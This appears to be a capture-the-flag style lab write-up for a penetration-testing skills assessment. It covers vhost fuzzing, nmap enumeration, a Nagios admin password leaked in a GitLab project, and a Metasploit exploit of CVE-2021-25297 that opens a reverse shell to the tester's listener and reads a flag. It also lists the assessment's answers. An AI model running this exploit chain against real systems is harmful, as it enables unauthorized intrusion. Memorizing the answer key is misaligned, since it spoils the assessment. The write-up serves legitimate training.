# Attacking Common Applications - Skills Assessment II
During an external penetration test for the company Inlanefreight, you come across a host that, at first glance, does not seem extremely interesting. At this point in the assessment, you have exhausted all options and hit several dead ends. Looking back through your enumeration notes, something catches your eye about this particular host. You also see a note that you don't recall about the `gitlab.inlanefreight.local` vhost.

Performing deeper and iterative enumeration reveals several serious flaws. Enumerate the target carefully and answer all the questions below to complete the second part of the skills assessment.

## Questions
> vHosts needed for these questions:
> - gitlab.inlanefreight.local
1. What is the URL of the WordPress instance? **Answer: http://blog.inlanefreight.local**
   - Run a fuzzing for subdomains belonging to `inlanefreight.local`:
        ```sh
        $ ffuf -u http://10.129.201.90 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.inlanefreight.local" -ic -fs 46166

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
        ________________________________________________

        :: Method           : GET
        :: URL              : http://10.129.201.90
        :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
        :: Header           : Host: FUZZ.inlanefreight.local
        :: Follow redirects : false
        :: Calibration      : false
        :: Timeout          : 10
        :: Threads          : 40
        :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
        :: Filter           : Response size: 46166
        ________________________________________________

        monitoring              [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 181ms]
        blog                    [Status: 200, Size: 50115, Words: 16140, Lines: 1015, Duration: 4379ms]
        gitlab                  [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 154ms]
        :: Progress: [4989/4989] :: Job [1/1] :: 256 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
        ```
   - Add all 3 to `/etc/hosts` and try to visit each one → `blog.inlanefreight.local` is the host running Wordpress
2. What is the name of the public GitLab project? **Answer: virtualhost**
   - Run a nmap scan, notice the `http-title` for gitlab instance:
        ```sh
        $ sudo nmap -sV -sC -Pn -p- -T4 10.129.201.90
        Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-29 00:47 EDT
        Nmap scan report for 10.129.201.90
        Host is up (0.16s latency).
        Not shown: 65526 closed tcp ports (reset)
        PORT     STATE SERVICE    VERSION
        22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
        |   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
        |_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
        25/tcp   open  smtp       Postfix smtpd
        |_smtp-commands: skills2, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
        80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
        |_http-server-header: Apache/2.4.41 (Ubuntu)
        |_http-title:  Shipter\xE2\x80\x93Transport and Logistics HTML5 Template 
        389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
        443/tcp  open  ssl/http   Apache httpd 2.4.41 ((Ubuntu))
        |_ssl-date: TLS randomness does not represent time
        |_http-title:  Shipter\xE2\x80\x93Transport and Logistics HTML5 Template 
        | tls-alpn: 
        |_  http/1.1
        | ssl-cert: Subject: commonName=10.129.201.90/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
        | Not valid before: 2021-09-02T01:49:48
        |_Not valid after:  2031-08-31T01:49:48
        |_http-server-header: Apache/2.4.41 (Ubuntu)
        5667/tcp open  tcpwrapped
        8060/tcp open  http       nginx 1.18.0
        |_http-title: 404 Not Found
        |_http-server-header: nginx/1.18.0
        8180/tcp open  http       nginx
        |_http-trane-info: Problem with XML parsing of /evox/about
        | http-title: Sign in \xC2\xB7 GitLab
        |_Requested resource was http://10.129.201.90:8180/users/sign_in
        | http-robots.txt: 54 disallowed entries (15 shown)
        | / /autocomplete/users /autocomplete/projects /search 
        | /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/ 
        |_/*/new /*/edit /*/raw
        9094/tcp open  unknown
        Service Info: Host:  skills2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
        ```
   - Visit `/help` then click on `Projects` to get navigated to `/explore` and found the public project
3. What is the FQDN of the third vhost? **Answer: monitoring.inlanefreight.local/**
4. What application is running on this third vhost? (One word) **Answer: nagios**
5. What is the admin password to access this application? **Answer: oilaKglm7M09@CPL&^lC**
   - Create a gitlab account then navigate to `/explore`, notice a new project showed up with `Administrator / Nagios Postgresql`
   - Read the password in the `INSTALL` file:
        ```
        <SNIP>
        postgres=# CREATE USER nagiosadmin WITH PASSWORD 'oilaKglm7M09@CPL&^lC';
        CREATE USER
        <SNIP>
        ```
6. Obtain reverse shell access on the target and submit the contents of the flag.txt file. **Answer: afe377683dce373ec2bf7eaf1e0107eb**
   - Nagios XI version 5.7.5 is vulnerable to CVE-2021-25297. Exploit this CVE with metasploit:
        ```sh
$ msfconsole -q
[msf](Jobs:0 Agents:0) >> search CVE-2021-25297

Matching Modules
================

   #  Name                                                          Disclosure Date  Rank       Check  Description
   -  ----                                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/nagios_xi_configwizards_authenticated_rce  2021-02-13       excellent  Yes    Nagios XI 5.5.6 to 5.7.5 - ConfigWizards Authenticated Remote Code Exection
   1    \_ target: Linux (x86)                                      .                .          .      .
   2    \_ target: Linux (x64)                                      .                .          .      .
   3    \_ target: CMD                                              .                .          .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/http/nagios_xi_configwizards_authenticated_rce
After interacting with a module you can manually set a TARGET with set TARGET 'CMD'

[msf](Jobs:0 Agents:0) >> use 0
[*] Using configured payload cmd/unix/reverse_perl_ssl
[msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_configwizards_authenticated_rce) >> set PASSWORD oilaKglm7M09@CPL&^lC
PASSWORD => oilaKglm7M09@CPL&^lC
[msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_configwizards_authenticated_rce) >> set RHOSTS monitoring.inlanefreight.local
RHOSTS => monitoring.inlanefreight.local
[msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_configwizards_authenticated_rce) >> set RHOSTS 10.129.67.53
RHOSTS => 10.129.67.53
[msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_configwizards_authenticated_rce) >> set VHOST monitoring.inlanefreight.local
VHOST => monitoring.inlanefreight.local
[msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_configwizards_authenticated_rce) >> set LHOST 10.10.15.124
LHOST => 10.10.15.124
[msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_configwizards_authenticated_rce) >> set TARGET_CVE CVE-2021-25297
TARGET_CVE => CVE-2021-25297
[msf](Jobs:0 Agents:0) exploit(linux/http/nagios_xi_configwizards_authenticated_rce) >> exploit
[*] Started reverse SSL handler on 10.10.15.124:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI.
[*] Target is Nagios XI with version 5.7.5.
[+] The target appears to be vulnerable.
[*] Sending the payload...
[*] Command shell session 1 opened (10.10.15.124:4444 -> 10.129.67.53:36436) at 2026-06-29 03:10:01 -0400
pwd
/usr/local/nagiosxi/html/config
find /usr/local/nagiosxi -name "*flag*"
/usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt
cat /usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt
afe377683dce373ec2bf7eaf1e0107eb

        ```